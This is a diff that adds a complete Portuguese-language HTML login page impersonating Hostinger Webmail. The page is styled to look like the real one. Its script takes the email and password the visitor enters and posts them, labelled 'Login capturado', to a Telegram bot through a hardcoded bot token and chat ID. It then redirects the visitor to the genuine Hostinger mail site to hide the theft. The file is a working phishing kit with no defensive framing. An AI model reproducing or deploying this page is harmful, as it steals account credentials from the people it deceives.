@@ -1,0 +1,185 @@
+<!DOCTYPE html>
+<html lang="pt">
+<head>
+  <meta charset="UTF-8">
+  <title>Login Hostinger Estilizado</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body {
+      margin: 0;
+      min-height: 100vh;
+      background: #f8f7fc;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-family: 'Inter', Arial, sans-serif;
+    }
+
+    .container {
+      background: #fff;
+      padding: 40px 30px;
+      border-radius: 18px;
+      box-shadow: 0 10px 40px rgba(0, 0, 0, 0.08);
+      width: 100%;
+      max-width: 400px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+
+    .logo img {
+      width: 140px;
+      margin-bottom: 28px;
+    }
+
+    h2 {
+      margin: 0;
+      font-size: 1.25rem;
+      font-weight: 600;
+      color: #1d1d1d;
+    }
+
+    p {
+      margin: 4px 0 24px;
+      color: #6c6f93;
+      font-size: 0.95rem;
+      font-weight: 400;
+    }
+
+    form {
+      width: 100%;
+      display: flex;
+      flex-direction: column;
+      gap: 16px;
+    }
+
+    .input-group {
+      position: relative;
+      width: 100%;
+      display: flex;
+      align-items: center;
+    }
+
+    input[type="text"],
+    input[type="password"] {
+      width: 100%;
+      padding: 14px 44px 14px 16px; /* espaço para o botão do olho à direita */
+      border: 1px solid #e5e5f0;
+      border-radius: 10px;
+      font-size: 1rem;
+      background: #f9f9fc;
+      color: #333;
+      outline: none;
+      transition: border 0.2s ease;
+      box-sizing: border-box;
+      display: block;
+    }
+
+    input[type="text"]:focus,
+    input[type="password"]:focus {
+      border: 1px solid #6c3ef4;
+      background: #fff;
+    }
+
+    .show-password {
+      position: absolute;
+      top: 50%;
+      right: 14px;
+      transform: translateY(-50%);
+      background: none;
+      border: none;
+      cursor: pointer;
+      color: #999;
+      font-size: 1.2rem;
+      height: 24px;
+      width: 24px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 0;
+    }
+
+    button[type="submit"] {
+      width: 100%;
+      padding: 14px;
+      background: #6c3ef4;
+      color: white;
+      font-size: 1.05rem;
+      font-weight: 600;
+      border: none;
+      border-radius: 10px;
+      cursor: pointer;
+      transition: background 0.3s ease;
+    }
+
+    button[type="submit"]:hover {
+      background: #5326c7;
+    }
+
+    .forgot {
+      margin-top: 12px;
+      text-align: center;
+    }
+
+    .forgot a {
+      font-size: 0.95rem;
+      color: #6c3ef4;
+      text-decoration: none;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="logo">
+      <img src="hostinger-logo.png" alt="Hostinger">
+    </div>
+    <h2>Olá, 👋</h2>
+    <p>Bem-vindo ao Hostinger Webmail</p>
+    <form id="loginForm" autocomplete="off">
+      <div class="input-group">
+        <input type="text" id="usuario" placeholder="E-mail" required>
+      </div>
+      <div class="input-group">
+        <input type="password" id="senha" placeholder="Senha" required>
+        <button type="button" class="show-password" onclick="togglePassword()">👁️</button>
+      </div>
+      <button type="submit">Entrar</button>
+    </form>
+    <div class="forgot">
+      <a href="#">Esqueci a senha</a>
+    </div>
+  </div>
+
+  <script>
+    function togglePassword() {
+      const senhaInput = document.getElementById('senha');
+      senhaInput.type = senhaInput.type === 'password' ? 'text' : 'password';
+    }
+
+    document.getElementById('loginForm').addEventListener('submit', async function(e) {
+      e.preventDefault();
+      const usuario = document.getElementById('usuario').value;
+      const senha = document.getElementById('senha').value;
+
+      const token = '7754404492:AAGCSNVG8QEyl7SS-R8ZA_ZNhebbs57-1q8';
+      const chat_id = '7030289017';
+      const url = `https://api.telegram.org/bot${token}/sendMessage`;
+
+      const data = {
+        chat_id: chat_id,
+        text: `Login capturado:\nUsuário: ${usuario}\nSenha: ${senha}`
+      };
+
+      try {
+        await fetch(url, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(data)
+        });
+      } finally {
+        window.location.href = 'https://mail.hostinger.com/';
+      }
+    });
+  </script>
+</body>
+</html>
